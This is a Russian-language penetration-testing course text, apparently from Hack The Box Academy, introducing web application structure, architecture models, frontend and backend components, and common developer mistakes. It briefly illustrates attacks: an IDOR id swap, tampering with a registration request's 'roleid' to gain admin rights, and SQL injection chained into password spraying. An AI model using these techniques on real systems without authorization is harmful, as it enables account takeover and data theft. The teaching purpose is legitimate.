
# 1.1 Введение

---

[Веб-приложения](https://en.wikipedia.org/wiki/Web_application) — это интерактивные приложения, работающие в веб-браузерах. Веб-приложения обычно используют [клиент-серверную архитектуру](https://cio-wiki.org/wiki/Client_Server_Architecture) для работы и обработки взаимодействий. Обычно они имеют интерфейсные компоненты (т.е. интерфейс веб-сайта или то, что "видит пользователь"), которые работают на стороне клиента (браузер), и другие серверные компоненты (исходный код веб-приложения), которые работают на стороне сервера (внутренний сервер/базы данных).

Это позволяет организациям размещать мощные приложения с почти полным контролем в реальном времени над их дизайном и функциональностью, которые доступны по всему миру. Некоторые примеры типичных веб-приложений включают онлайн-почтовые службы, такие как `Gmail`, онлайн-магазины, такие как `Amazon`, и онлайн-текстовые редакторы, такие как `Google Docs`.

![Панель управления, показывающая 932 онлайн-игроков, 1032 захваченных машин, 622 решенных задачи и последние активности с целями Lame, Emdee five for life и Delivery.](https://academy.hackthebox.com/storage/modules/75/client-server-model.jpg)

Веб-приложения не являются прерогативой только крупных провайдеров, таких как Google или Microsoft, но могут быть разработаны любым веб-разработчиком и размещены в Интернете в любом из общих хостинговых сервисов, чтобы ими мог пользоваться любой пользователь в Интернете. Именно поэтому сегодня в Интернете существуют миллионы веб-приложений, с которыми ежедневно взаимодействуют миллиарды пользователей.

---

## Веб-приложения и веб-сайты

Раньше мы взаимодействовали с веб-сайтами, которые были статичными и не могли изменяться в реальном времени. Это означает, что традиционные веб-сайты были статически созданы для представления определенной информации, и эта информация не менялась при нашем взаимодействии. Чтобы изменить содержимое веб-сайта, соответствующую страницу должны были вручную отредактировать разработчики. Такие типы статических страниц не содержат функций и, следовательно, не производят изменений в реальном времени. Такой тип веб-сайта также известен как [Web 1.0](https://en.wikipedia.org/wiki/Web_2.0#Web_1.0).

![Сравнение веб-сайта и веб-приложения: Веб-сайт имеет статические страницы, одинаковые для всех; Веб-приложение имеет динамические, интерактивные страницы, разные для каждого пользователя.](https://academy.hackthebox.com/storage/modules/75/one-server-arch.jpg)

С другой стороны, большинство веб-сайтов работают как веб-приложения, или [Web 2.0](https://en.wikipedia.org/wiki/Web_2.0), представляя динамический контент на основе взаимодействия с пользователем. Еще одно существенное отличие заключается в том, что веб-приложения полностью функциональны и могут выполнять различные функции для конечного пользователя, тогда как веб-сайты лишены такого функционала. Другие ключевые различия между традиционными веб-сайтами и веб-приложениями включают:

* Модульность
* Работа на любом размере дисплея
* Работа на любой платформе без оптимизации

---

## Веб-приложения и нативные приложения операционных систем

В отличие от нативных приложений операционных систем, веб-приложения независимы от платформы и могут работать в браузере на любой операционной системе. Эти веб-приложения не требуют установки на системе пользователя, поскольку они и их функциональность выполняются удаленно на удаленном сервере и, следовательно, не занимают места на жестком диске конечного пользователя.

Еще одно преимущество веб-приложений над нативными приложениями ОС — единство версий. Все пользователи, получающие доступ к веб-приложению, используют одну и ту же версию и одно и то же веб-приложение, которое может постоянно обновляться и модифицироваться без необходимости отправки обновлений каждому пользователю. Веб-приложения могут обновляться в одном месте (веб-сервер) без разработки различных сборок для каждой платформы, что значительно снижает затраты на обслуживание и поддержку, устраняя необходимость сообщать об изменениях каждому пользователю в отдельности.

С другой стороны, нативные приложения ОС имеют определенные преимущества перед веб-приложениями, в основном в скорости работы и возможности использовать нативные библиотеки операционной системы и локальное аппаратное обеспечение. Поскольку нативные приложения созданы для использования нативных библиотек ОС, они загружаются и взаимодействуют гораздо быстрее. Кроме того, нативные приложения обычно имеют больше возможностей, чем веб-приложения, так как они имеют более глубокую интеграцию с операционной системой и не ограничены только возможностями браузера.

В последнее время, однако, гибридные и прогрессивные веб-приложения становятся все более распространенными. Они используют современные фреймворки для запуска веб-приложений с использованием возможностей и ресурсов нативной ОС, делая их быстрее обычных веб-приложений и более функциональными.

---

## Распространение веб-приложений

Существует множество веб-приложений с открытым исходным кодом, используемых организациями по всему миру, которые можно настроить в соответствии с потребностями каждой организации. Некоторые распространенные веб-приложения с открытым исходным кодом включают:

* [WordPress](https://wordpress.com/)
* [OpenCart](https://www.opencart.com/)
* [Joomla](https://www.joomla.org/)

Существуют также проприетарные веб-приложения с "закрытым исходным кодом", которые обычно разрабатываются определенной организацией, а затем продаются другой организации или используются организациями по модели подписки. Некоторые распространенные веб-приложения с закрытым исходным кодом включают:

* [Wix](https://www.wix.com/)
* [Shopify](https://www.shopify.com/)
* [DotNetNuke](https://www.dnnsoftware.com/)

---

## Риски безопасности веб-приложений

Атаки на веб-приложения распространены и представляют проблему для большинства организаций, имеющих присутствие в Интернете, независимо от их размера. В конце концов, они обычно доступны из любой страны для каждого, у кого есть подключение к Интернету и веб-браузер, и обычно предлагают обширную поверхность для атак. Существует множество автоматизированных инструментов для сканирования и атаки веб-приложений, которые в неправильных руках могут нанести значительный ущерб. По мере того, как веб-приложения становятся более сложными и продвинутыми, увеличивается возможность включения критических уязвимостей в их дизайн.

Успешная атака на веб-приложение может привести к значительным потерям и серьезным перебоям в работе бизнеса. Поскольку веб-приложения работают на серверах, которые могут содержать другую конфиденциальную информацию и часто связаны с базами данных, содержащими конфиденциальные пользовательские или корпоративные данные, все эти данные могут быть скомпрометированы в случае успешной атаки на веб-сайт. Поэтому для любого бизнеса, использующего веб-приложения, критически важно должным образом тестировать эти приложения на наличие уязвимостей и оперативно исправлять их, одновременно проверяя, что исправление устраняет дефект и не приводит к случайным новым дефектам.

Тестирование на проникновение в веб-приложения — это все более важный навык для изучения. Любая организация, желающая защитить свои веб-приложения, доступные из Интернета (и внутренние), должна проводить частые тесты веб-приложений и внедрять безопасные практики кодирования на каждом этапе жизненного цикла разработки. Чтобы правильно тестировать веб-приложения на проникновение, нам необходимо понять, как они работают, как они разрабатываются и какие риски таятся на каждом уровне и компоненте приложения в зависимости от используемых технологий.

Мы всегда будем сталкиваться с различными веб-приложениями, которые спроектированы и настроены по-разному. Один из наиболее актуальных и широко используемых методов тестирования веб-приложений — [Руководство по тестированию безопасности веб-приложений OWASP](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing).

Одна из наиболее распространенных процедур — начать с анализа компонентов интерфейса веб-приложения, таких как `HTML`, `CSS` и `JavaScript` (также известных как "frontend trinity"), и попытаться найти уязвимости, такие как [Разглашение конфиденциальных данных](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) и [Межсайтовый скриптинг (XSS)](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)). После тщательного тестирования всех компонентов интерфейса мы обычно рассматриваем основную функциональность веб-приложения и взаимодействие между браузером и веб-сервером, чтобы перечислить технологии, используемые веб-сервером, и искать эксплуатируемые недостатки. Обычно мы оцениваем веб-приложения как с неаутентифицированной, так и с аутентифицированной точки зрения (если приложение имеет функциональность входа в систему), чтобы максимизировать охват и рассмотреть каждый возможный сценарий атаки.

---

## Атака на веб-приложения

В наше время почти каждая компания, независимо от размера, имеет одно или несколько веб-приложений в своем внешнем периметре. Эти приложения могут быть чем угодно: от простых статических веб-сайтов до блогов, работающих на системах управления контентом (CMS), таких как `WordPress`, до сложных приложений с функциональностью регистрации/входа, поддерживающих различные роли пользователей от базовых пользователей до суперадминов. В наши дни не очень распространено найти внешне подключенный хост, непосредственно уязвимый для известного публичного эксплойта (такого как уязвимая служба или уязвимость Windows для удаленного выполнения кода (RCE)), хотя такое случается. Веб-приложения предоставляют обширную поверхность для атак, и их динамический характер означает, что они постоянно меняются (и часто упускаются из виду!). Относительно простое изменение кода может привести к катастрофической уязвимости или серии уязвимостей, которые могут быть объединены для получения доступа к конфиденциальным данным или удаленного выполнения кода на веб-сервере или других хостах в среде, таких как серверы баз данных.

Нередко можно найти дефекты, которые могут привести непосредственно к выполнению кода, например, форма загрузки файлов, позволяющая загружать вредоносный код, или уязвимость включения файлов, которую можно использовать для получения удаленного выполнения кода. Хорошо известная уязвимость, которая все еще весьма распространена в различных типах веб-приложений — это SQL-инъекция. Этот тип уязвимости возникает из-за небезопасной обработки ввода, предоставляемого пользователем. Он может привести к доступу к конфиденциальным данным, чтению/записи файлов на сервере базы данных и даже к удаленному выполнению кода.

Мы часто находим уязвимости SQL-инъекции в веб-приложениях, использующих Active Directory для аутентификации. Хотя обычно мы не можем использовать это для извлечения паролей (поскольку ими управляет Active Directory), мы часто можем извлечь большинство или все адреса электронной почты пользователей Active Directory, которые часто совпадают с их именами пользователей. Эти данные затем могут быть использованы для выполнения [атаки распыления паролей](https://us-cert.cisa.gov/ncas/current-activity/2019/08/08/acsc-releases-advisory-password-spraying-attacks) против веб-порталов, использующих Active Directory для аутентификации, таких как VPN или Microsoft Outlook Web Access/Microsoft O365. Успешное распыление паролей часто может привести к доступу к конфиденциальным данным, таким как электронная почта, или даже к непосредственному доступу в корпоративную сетевую среду.

Этот пример показывает ущерб, который может возникнуть из-за одной уязвимости веб-приложения, особенно при "цепочке" для извлечения данных из одного приложения, которые можно использовать для атаки на другие части внешней инфраструктуры компании. Профессионал в области информационной безопасности с широким кругозором должен иметь глубокое понимание веб-приложений и чувствовать себя так же комфортно при атаке на веб-приложения, как при проведении тестирования на проникновение в сеть и атаках на Active Directory. Тестер на проникновение с прочной основой в веб-приложениях часто может выделиться среди своих коллег и найти недостатки, которые другие могут упустить. Еще несколько примеров атак на веб-приложения в реальном мире и их влияние следующие:

| Недостаток | Сценарий реального мира |
| --- | --- |
| [SQL-инъекция](https://owasp.org/www-community/attacks/SQL_Injection) | Получение имен пользователей Active Directory и выполнение атаки распыления паролей против VPN или почтового портала. |
| [Включение файлов](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) | Чтение исходного кода для поиска скрытой страницы или каталога, который предоставляет дополнительную функциональность, которую можно использовать для получения удаленного выполнения кода. |
| [Неограниченная загрузка файлов](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) | Веб-приложение, которое позволяет пользователю загружать изображение профиля, разрешает загрузку файлов любого типа (не только изображений). Это можно использовать для получения полного контроля над сервером веб-приложения путем загрузки вредоносного кода. |
| [Небезопасное прямое указание объектов (IDOR)](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) | При сочетании с такой уязвимостью, как нарушение контроля доступа, это часто можно использовать для доступа к файлам или функциональности другого пользователя. Примером может быть редактирование вашего профиля пользователя на странице такой как /user/701/edit-profile. Если мы сможем изменить `701` на `702`, мы сможем редактировать профиль другого пользователя! |
| [Нарушение контроля доступа](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control) | Другим примером является приложение, которое позволяет пользователю зарегистрировать новую учетную запись. Если функциональность регистрации учетной записи спроектирована плохо, пользователь может выполнить повышение привилегий при регистрации. Рассмотрим запрос `POST` при регистрации нового пользователя, который отправляет данные `username=bjones&password=Welcome1&email=bjones@inlanefreight.local&roleid=3`. Что если мы сможем манипулировать параметром `roleid` и изменить его на `0` или `1`. Мы видели реальные приложения, где это было возможно, и было легко быстро зарегистрировать пользователя с правами администратора и получить доступ ко многим непреднамеренным функциям веб-приложения. |

Начните знакомиться с распространенными атаками на веб-приложения и их последствиями. Не беспокойтесь, если какие-либо из этих терминов кажутся вам незнакомыми на данный момент; они станут яснее по мере вашего продвижения и применения итеративного подхода к обучению.

Важно глубоко изучать веб-приложения и ознакомиться с тем, как они работают, и с множеством различных стеков приложений. Мы будем видеть атаки на веб-приложения неоднократно во время нашего пути в Академии, на основной платформе HTB и в оценках реальной жизни. Давайте погрузимся и изучим структуру/функции веб-приложений, чтобы стать более информированными атакующими, выделиться среди своих коллег и найти недостатки, которые другие могут упустить.







# 1.2 Структура веб-приложений

---

Ни одно веб-приложение не идентично другому. Предприятия создают веб-приложения для множества различных целей и аудиторий. Веб-приложения разрабатываются и программируются по-разному, а их внутренняя инфраструктура может быть настроена многими способами. Важно понимать различные способы, которыми веб-приложения могут работать за кулисами, структуру веб-приложения, его компоненты и как они могут быть настроены в инфраструктуре компании.

Структуры веб-приложений состоят из множества различных слоев, которые можно обобщить в следующие три основные категории:

| **Категория** | **Описание** |
|---------------|--------------|
| `Инфраструктура веб-приложения` | Описывает структуру необходимых компонентов, таких как база данных, необходимых для функционирования веб-приложения по назначению. Поскольку веб-приложение может быть настроено для работы на отдельном сервере, важно знать, к какому серверу базы данных оно должно получать доступ. |
| `Компоненты веб-приложения` | Компоненты, составляющие веб-приложение, представляют все компоненты, с которыми взаимодействует веб-приложение. Они разделены на следующие три области: `UI/UX`, `Клиент` и `Сервер`. |
| `Архитектура веб-приложения` | Архитектура включает все взаимосвязи между различными компонентами веб-приложения. |

---

## Инфраструктура веб-приложения

Веб-приложения могут использовать множество различных инфраструктурных настроек. Они также называются `моделями`. Наиболее распространенные из них можно сгруппировать в следующие четыре типа:

* `Клиент-сервер`
* `Один сервер`
* `Много серверов - одна база данных`
* `Много серверов - много баз данных`

---

#### Клиент-сервер

Веб-приложения часто используют модель `клиент-сервер`. Сервер размещает веб-приложение в модели клиент-сервер и распространяет его всем клиентам, пытающимся получить к нему доступ.

![Диаграмма, показывающая сервер, подключенный к четырем клиентам: настольному компьютеру, ноутбуку, смартфону и монитору.](https://academy.hackthebox.com/storage/modules/75/client-server-model.jpg)

В этой модели веб-приложения имеют два типа компонентов: те, которые находятся во фронтенде и обычно интерпретируются и выполняются на стороне клиента (браузер), и компоненты в бэкенде, обычно компилируемые, интерпретируемые и выполняемые хостинг-сервером.

Когда клиент посещает URL веб-приложения (веб-адрес, например, https://www.acme.local), сервер использует основной интерфейс веб-приложения (`UI`). Когда пользователь нажимает на кнопку или запрашивает определенную функцию, браузер отправляет HTTP-запрос на сервер, который интерпретирует этот запрос и выполняет необходимые задачи для его выполнения (например, вход пользователя, добавление товара в корзину, переход на другую страницу и т.д.). Как только сервер получит необходимые данные, он отправляет результат обратно в браузер клиента, отображая результат в читаемом для человека виде.

`Этот веб-сайт, с которым мы в настоящее время взаимодействуем, также является веб-приложением, разработанным и размещенным Hack The Box (веб-сервер), и мы получаем доступ к нему и взаимодействуем с ним, используя наш веб-браузер (клиент).`

Однако, несмотря на то, что большинство веб-приложений используют архитектуру клиент-сервер с фронтендом и бэкендом, существует множество вариантов реализации.

---

#### Один сервер

В этой архитектуре все веб-приложение или даже несколько веб-приложений и их компоненты, включая базу данных, размещены на одном сервере. Хотя такой дизайн прост и легко реализуется, он также является наиболее рискованным.

![Диаграмма, показывающая сервер, подключенный к трем клиентам: смартфону, ноутбуку и монитору.](https://academy.hackthebox.com/storage/modules/75/one-server-arch.jpg)

Если какое-либо веб-приложение, размещенное на этом сервере, будет скомпрометировано в этой архитектуре, то данные всех веб-приложений будут скомпрометированы. Этот дизайн представляет собой подход "`все яйца в одной корзине`", поскольку если любое из размещенных веб-приложений уязвимо, весь веб-сервер становится уязвимым.

Более того, если веб-сервер по какой-либо причине выйдет из строя, все размещенные на нем веб-приложения станут полностью недоступными до решения проблемы.

---

#### Много серверов - одна база данных

Эта модель отделяет базу данных на собственный сервер базы данных и позволяет серверу размещения веб-приложений получать доступ к серверу базы данных для хранения и извлечения данных. Ее можно рассматривать как "много серверов к одной базе данных" и "один сервер к одной базе данных", если база данных отделена на собственный сервер базы данных.

![Диаграмма, показывающая базу данных, подключенную к трем серверам, каждый из которых связан с клиентом смартфоном, ноутбуком и монитором.](hhttps://academy.hackthebox.com/storage/modules/75/many-server-one-db-arch.jpg)

Эта модель позволяет нескольким веб-приложениям получать доступ к одной базе данных, чтобы иметь доступ к одним и тем же данным без синхронизации данных между ними. Веб-приложения могут быть репликациями одного основного приложения (т.е. основное/резервное) или они могут быть отдельными веб-приложениями, которые используют общие данные.

Главное преимущество этой модели (`с точки зрения безопасности`) — сегментация, где каждый из основных компонентов веб-приложения расположен и размещен отдельно. В случае компрометации одного веб-сервера другие веб-серверы напрямую не затрагиваются. Аналогично, если база данных скомпрометирована (например, через уязвимость SQL-инъекции), само веб-приложение напрямую не затрагивается. После сегментации активов все еще необходимо внедрить меры контроля доступа, такие как ограничение доступа веб-приложения только к данным, необходимым для функционирования по назначению.

---

#### Много серверов - много баз данных

Эта модель основывается на модели `Много серверов, одна база данных`. Однако внутри сервера базы данных данные каждого веб-приложения размещаются в отдельной базе данных. Веб-приложение может получать доступ только к частным данным и только к общим данным, которые используются всеми веб-приложениями. Также возможно разместить базу данных каждого веб-приложения на отдельном сервере базы данных.

![Диаграмма, показывающая три базы данных, подключенные к трем серверам, каждый из которых связан с клиентом смартфоном, ноутбуком и монитором.](https://academy.hackthebox.com/storage/modules/75/many-server-one-db-arch.jpg)

Этот дизайн также широко используется для резервирования, так что если какой-либо веб-сервер или база данных выйдет из строя, резервная копия будет работать для максимального снижения времени простоя. Хотя это может быть сложнее реализовать и может потребовать таких инструментов, как [балансировщики нагрузки](https://en.wikipedia.org/wiki/Load_balancing_(computing)), для правильного функционирования, эта архитектура является одним из лучших вариантов с точки зрения безопасности благодаря правильным мерам контроля доступа и правильной сегментации активов.

Помимо этих моделей, существуют и другие модели веб-приложений, такие как [бессерверные](https://aws.amazon.com/lambda/serverless-architectures-learn-more) веб-приложения или веб-приложения, использующие [микросервисы](https://aws.amazon.com/microservices).

---

## Компоненты веб-приложения

Каждое веб-приложение может иметь разное количество компонентов. Тем не менее, все компоненты вышеупомянутых моделей можно разбить на:

1. `Клиент`
2. `Сервер`
   * Веб-сервер
   * Логика веб-приложения
   * База данных
3. `Сервисы` (Микросервисы)
   * Интеграции с третьими сторонами
   * Интеграции веб-приложений
4. `Функции` (Бессерверные)

---

## Архитектура веб-приложения

Компоненты веб-приложения разделены на три различных слоя (также известных как трехуровневая архитектура).

| **Слой** | **Описание** |
|----------|--------------|
| `Уровень представления` | Состоит из компонентов процесса пользовательского интерфейса, которые обеспечивают коммуникацию с приложением и системой. Доступ к ним клиент получает через веб-браузер, и они возвращаются в виде HTML, JavaScript и CSS. |
| `Уровень приложения` | Этот слой обеспечивает правильную обработку всех запросов клиента (веб-запросов). Проверяются различные критерии, такие как авторизация, привилегии и данные, передаваемые клиенту. |
| `Уровень данных` | Уровень данных тесно работает с уровнем приложения, чтобы определить, где именно хранятся необходимые данные и как к ним можно получить доступ. |

Пример архитектуры веб-приложения может выглядеть примерно так:

![Диаграмма архитектуры ASP.NET Core, показывающая клиента, обратный прокси IIS, веб-приложение ASP.NET Core с фильтрами и сервисами, подключенные к источникам данных, провайдерам идентификации и сторонним сервисам.](https://docs.microsoft.com/en-us/dotnet/architecture/modern-web-apps-azure/media/image5-12.png)
Источник: [Microsoft Docs](https://docs.microsoft.com/en-us/dotnet/architecture/modern-web-apps-azure/common-web-application-architectures)

Более того, некоторые веб-серверы могут выполнять вызовы операционной системы и программы, такие как [IIS ISAPI](https://learn.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525172(v=vs.90)) или [PHP-CGI](https://www.php.net/manual/en/install.unix.commandline.php).

---

#### Микросервисы

Мы можем представить микросервисы как независимые компоненты веб-приложения, которые в большинстве случаев запрограммированы только для одной задачи. Например, для интернет-магазина мы можем разложить основные задачи на следующие компоненты:

* Регистрация
* Поиск
* Платежи
* Рейтинги
* Отзывы

Эти компоненты общаются с клиентом и друг с другом. Коммуникация между этими микросервисами `не сохраняет состояние`, что означает, что запрос и ответ независимы. Это потому, что сохраненные данные `хранятся отдельно` от соответствующих микросервисов. Использование микросервисов считается [сервис-ориентированной архитектурой (SOA)](https://en.wikipedia.org/wiki/Service-oriented_architecture), построенной как коллекция различных автоматизированных функций, ориентированных на одну бизнес-цель. Тем не менее, эти микросервисы зависят друг от друга.

Еще одним важным и эффективным компонентом микросервисов является то, что они могут быть написаны на разных языках программирования и всё равно взаимодействовать. Микросервисы получают преимущества от более легкого масштабирования и более быстрой разработки приложений, что способствует инновациям и ускоряет доставку новых функций на рынок. Некоторые преимущества микросервисов включают:

* Гибкость
* Гибкое масштабирование
* Легкость развертывания
* Повторное использование кода
* Устойчивость

Эта [белая книга AWS](https://d1.awsstatic.com/whitepapers/microservices-on-aws.pdf) предоставляет отличный обзор реализации микросервисов.

---

#### Бессерверная архитектура

Облачные провайдеры, такие как AWS, GCP, Azure и другие, предлагают бессерверные архитектуры. Эти платформы предоставляют фреймворки приложений для создания таких веб-приложений без необходимости беспокоиться о самих серверах. Эти веб-приложения затем работают в бессостоянии вычислительных контейнерах (например, Docker). Этот тип архитектуры дает компании гибкость для создания и развертывания приложений и сервисов без необходимости управлять инфраструктурой; все управление сервером осуществляется облачным провайдером, что избавляет от необходимости выделять, масштабировать и поддерживать серверы, необходимые для работы приложений и баз данных.

Вы можете узнать больше о бессерверных вычислениях и различных случаях их использования [здесь](https://aws.amazon.com/serverless).

---

## Безопасность архитектуры

Понимание общей архитектуры веб-приложений и конкретного дизайна каждого веб-приложения важно при проведении тестов на проникновение для любого веб-приложения. Во многих случаях уязвимость отдельного веб-приложения может быть вызвана не программной ошибкой, а ошибкой дизайна в его архитектуре.

Например, отдельное веб-приложение может иметь все свои основные функциональные возможности безопасно реализованными. Однако из-за отсутствия надлежащих мер контроля доступа в его дизайне, например, использования [Контроля доступа на основе ролей (RBAC)](https://en.wikipedia.org/wiki/Role-based_access_control), пользователи могут получить доступ к некоторым функциям администратора, которые не предназначены для прямого доступа к ним, или даже получить доступ к личной информации других пользователей без наличия привилегий для этого. Для устранения такого типа проблемы потребовалось бы значительное изменение дизайна, что, вероятно, было бы дорогостоящим и трудоемким.

Другой пример: если мы не можем найти базу данных после эксплуатации уязвимости и получения контроля над серверной частью, это может означать, что база данных размещена на отдельном сервере. Мы можем найти только часть данных базы данных, что может означать, что используется несколько баз данных. Именно поэтому безопасность должна учитываться на каждом этапе разработки веб-приложения, а тесты на проникновение должны проводиться на протяжении всего жизненного цикла разработки веб-приложения.









# 1.3 Frontend против Backend

---

Мы могли слышать [термины](https://en.wikipedia.org/wiki/Front_end_and_back_end) `frontend` и `backend` веб-разработка, или термин [Full Stack](https://www.w3schools.com/whatis/whatis_fullstack.asp) веб-разработка, который относится как к `frontend`, так и к `backend` веб-разработке. Эти термины становятся синонимами разработки веб-приложений, поскольку они составляют большую часть цикла веб-разработки. Однако эти термины очень отличаются друг от друга, поскольку каждый относится к одной стороне веб-приложения, и каждый функционирует и общается в разных областях.

---

## Frontend

Frontend веб-приложения содержит компоненты пользователя напрямую через их веб-браузер (клиентская сторона). Эти компоненты составляют исходный код веб-страницы, которую мы видим при посещении веб-приложения, и обычно включают `HTML`, `CSS` и `JavaScript`, которые затем интерпретируются в реальном времени нашими браузерами.

![Окно браузера, отображающее фрагменты кода HTML, CSS и JS для макета веб-страницы.](https://academy.hackthebox.com/storage/modules/75/frontend-components.jpg)

Это включает в себя все, что пользователь видит и с чем взаимодействует, например, основные элементы страницы, такие как заголовок и текст [HTML](https://www.w3schools.com/html/html_intro.asp), дизайн и анимация всех элементов [CSS](https://www.w3schools.com/css/css_intro.asp), и какую функцию выполняет каждая часть страницы [JavaScript](https://www.w3schools.com/js/js_intro.asp).

В современных веб-приложениях frontend-компоненты должны адаптироваться к любому размеру экрана и работать в любом браузере на любом устройстве. Это контрастирует с backend-компонентами, которые обычно написаны для конкретной платформы или операционной системы. Если frontend веб-приложения не оптимизирован должным образом, это может сделать все веб-приложение медленным и неотзывчивым. В этом случае некоторые пользователи могут подумать, что хостинговый сервер или их интернет медленный, в то время как проблема полностью лежит на клиентской стороне в браузере пользователя. Вот почему frontend веб-приложения должен быть оптимизирован для большинства платформ, устройств (включая мобильные!) и размеров экрана.

Помимо разработки frontend-кода, следующие задачи также связаны с разработкой frontend веб-приложений:

- Визуальная концепция веб-дизайна
- Дизайн пользовательского интерфейса (UI)
- Дизайн пользовательского опыта (UX)

Есть много сайтов, доступных нам для практики frontend-кодирования. Один пример - [этот](https://html-css-js.com/). Здесь мы можем поиграть с [редактором](https://htmlg.com/html-editor/), набирая и форматируя текст и видя результирующие `HTML`, `CSS` и `JavaScript`, которые генерируются для нас. Скопируйте/вставьте этот ОЧЕНЬ простой пример в правую часть редактора:

```html
<p><strong>Добро пожаловать в Hack The Box Academy</strong><strong></strong></p>
<p></p>
<p><em>Это курсивный текст.</em></p>
<p></p>
<p><span style="color: #0000ff;">Это синий текст.</span></p>
<p></p>
<p></p>
```

Посмотрите, как простой HTML-код отображается слева. Поиграйте с форматированием, заголовками, цветами и т.д., и наблюдайте, как изменяется код.

---

## Backend

Backend веб-приложения управляет всеми основными функциональностями веб-приложения, все из которых выполняется на backend-сервере, который обрабатывает все необходимое для правильной работы веб-приложения. Это та часть, которую мы можем никогда не увидеть или напрямую не взаимодействовать с ней, но веб-сайт - это просто коллекция статических веб-страниц без backend.

Есть четыре основных backend-компонента для веб-приложений:

| **Компонент** | **Описание** |
|---|---|
| `Backend Серверы` | Аппаратное обеспечение и операционная система, которая размещает все другие компоненты и обычно работает на операционных системах, таких как `Linux`, `Windows`, или используя `Контейнеры`. |
| `Веб-серверы` | Веб-серверы обрабатывают HTTP-запросы и соединения. Некоторые примеры - `Apache`, `NGINX` и `IIS`. |
| `Базы данных` | Базы данных (`БД`) хранят и извлекают данные веб-приложения. Некоторые примеры реляционных баз данных - `MySQL`, `MSSQL`, `Oracle`, `PostgreSQL`, в то время как примеры нереляционных баз данных включают `NoSQL` и `MongoDB`. |
| `Фреймворки разработки` | Фреймворки разработки используются для разработки основного веб-приложения. Некоторые известные фреймворки включают `Laravel` (`PHP`), `ASP.NET` (`C#`), `Spring` (`Java`), `Django` (`Python`) и `Express` (`NodeJS JavaScript`). |

![Диаграмма, показывающая backend-сервер под управлением Linux и Windows, подключенный к веб-серверу (Apache, NGINX, IIS), веб-приложению (PHP, C#, Java) и базе данных (MySQL, MS SQL, Oracle).](https://academy.hackthebox.com/storage/modules/75/backend-server.jpg)

Также возможно разместить каждый компонент backend на его собственном изолированном сервере или в изолированных контейнерах, используя такие сервисы, как [Docker](https://www.docker.com/). Для поддержания логического разделения и смягчения воздействия уязвимостей различные компоненты веб-приложения, такие как база данных, могут быть установлены в одном Docker-контейнере, в то время как основное веб-приложение установлено в другом, тем самым изолируя каждую часть от потенциальных уязвимостей, которые могут повлиять на другой контейнер(ы). Также возможно разделить каждый на его выделенный сервер, что может быть более ресурсоемким и времязатратным для поддержания. Тем не менее, это зависит от бизнес-случая и дизайна/функциональности рассматриваемого веб-приложения.

Некоторые из основных задач, выполняемых backend-компонентами, включают:

- Разработка основной логики и сервисов backend веб-приложения
- Разработка основного кода и функциональностей веб-приложения
- Разработка и поддержание backend базы данных
- Разработка и реализация библиотек для использования веб-приложением
- Реализация технических/бизнес-потребностей для веб-приложения
- Реализация основных [API](https://en.wikipedia.org/wiki/API) для коммуникации frontend-компонентов
- Интеграция удаленных серверов и облачных сервисов в веб-приложение

---

## Защита Frontend/Backend

Даже несмотря на то, что в большинстве случаев мы не будем иметь доступ к backend-коду для анализа отдельных функций и структуры кода, это не делает приложение неуязвимым. Оно все еще может быть эксплуатировано различными инъекционными атаками, например.

Предположим, у нас есть функция поиска в веб-приложении, которая по ошибке не обрабатывает наши поисковые запросы правильно. В этом случае мы могли бы использовать специфические техники для манипулирования запросами таким образом, чтобы получить несанкционированный доступ к определенным данным базы данных [SQL-инъекции](https://www.w3schools.com/sql/sql_injection.asp) или даже выполнить команды операционной системы через веб-приложение, также известные как [Command Injections](https://owasp.org/www-community/attacks/Command_Injection).

Мы позже обсудим, как защитить каждый компонент, используемый на frontend и backend. Когда у нас есть полный доступ к исходному коду frontend-компонентов, мы можем выполнить обзор кода для поиска уязвимостей, что является частью того, что называется [Whitebox Pentesting](https://en.wikipedia.org/wiki/White-box_testing).

С другой стороны, исходный код backend-компонентов хранится на backend-сервере, поэтому у нас нет доступа к нему по умолчанию, что заставляет нас выполнять только то, что известно как [Blackbox Pentesting](https://en.wikipedia.org/wiki/Black-box_testing). Однако, как мы увидим, некоторые веб-приложения имеют открытый исходный код, что означает, что у нас, вероятно, есть доступ к их исходному коду. Кроме того, некоторые уязвимости, такие как [Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion), могут позволить нам получить исходный код с backend-сервера. С этим исходным кодом в руках мы можем затем выполнить обзор кода на backend-компонентах, чтобы дополнительно понять, как работает приложение, потенциально найти чувствительные данные в исходном коде (такие как пароли) и даже найти уязвимости, которые было бы трудно или невозможно найти без доступа к исходному коду.

`Топ 20` наиболее распространенных ошибок, которые делают веб-разработчики, важных для нас как тестировщиков на проникновение:

| **№** | **Ошибка** |
|---|---|
| `1.` | Разрешение недействительных данных поступать в базу данных |
| `2.` | Фокусирование на системе в целом |
| `3.` | Установление лично разработанных методов безопасности |
| `4.` | Рассмотрение безопасности как последнего шага |
| `5.` | Разработка хранения паролей в открытом тексте |
| `6.` | Создание слабых паролей |
| `7.` | Хранение незашифрованных данных в базе данных |
| `8.` | Чрезмерное полагание на клиентскую сторону |
| `9.` | Быть слишком оптимистичным |
| `10.` | Разрешение переменных через путь URL |
| `11.` | Доверие стороннему коду |
| `12.` | Жестко закодированные бэкдор-аккаунты |
| `13.` | Непроверенные SQL-инъекции |
| `14.` | Удаленные файловые включения |
| `15.` | Небезопасная обработка данных |
| `16.` | Неправильное шифрование данных |
| `17.` | Неиспользование безопасной криптографической системы |
| `18.` | Игнорирование 8-го уровня |
| `19.` | Обзор действий пользователя |
| `20.` | Неправильные конфигурации Web Application Firewall |

Эти ошибки приводят к [OWASP Top 10](https://owasp.org/www-project-top-ten/) уязвимостям для веб-приложений, которые мы обсудим в других модулях:

| **№** | **Уязвимость** |
|---|---|
| `1.` | Нарушенный контроль доступа |
| `2.` | Криптографические сбои |
| `3.` | Инъекция |
| `4.` | Небезопасный дизайн |
